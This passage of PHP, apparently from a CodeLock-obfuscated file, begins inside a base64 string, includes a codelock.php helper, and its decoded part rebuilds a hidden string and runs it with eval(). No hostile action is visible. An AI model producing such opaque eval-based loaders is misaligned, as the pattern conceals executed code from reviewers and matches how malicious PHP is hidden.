kgLiAkY3VycmVudF9saW5rOw0KCSRkYXRhX3BvcyAgICAgICA9ICRkYXRhX3Bvc19lbmQ7DQp9DQokZmluYWxfZGF0YSAgICAuPSBzdWJzdHIoJGRhdGEsICRkYXRhX3Bvc19lbmQsc3RybGVuKCRkYXRhKS0kZGF0YV9wb3MpOw0KJGZpbmFsX2RhdGEgPSBzdHJfcmVwbGFjZSgiXCciLCInIiwkZmluYWxfZGF0YSk7DQokZmluYWxfZGF0YSA9IHN0cl9yZXBsYWNlKCdcIicsJyInLCRmaW5hbF9kYXRhKTsNCiRmaW5hbF9kYXRhID0gc3RyX3JlcGxhY2UoIi8nIiwiJyIsJGZpbmFsX2RhdGEpOw0KJGZpbmFsX2RhdGEgPSBzdHJfcmVwbGFjZSgnLyInLCciJywkZmluYWxfZGF0YSk7DQpldmFsKCRmaW5hbF9kYXRhKTs="; include($codelock_filed."/codelock.php");?>
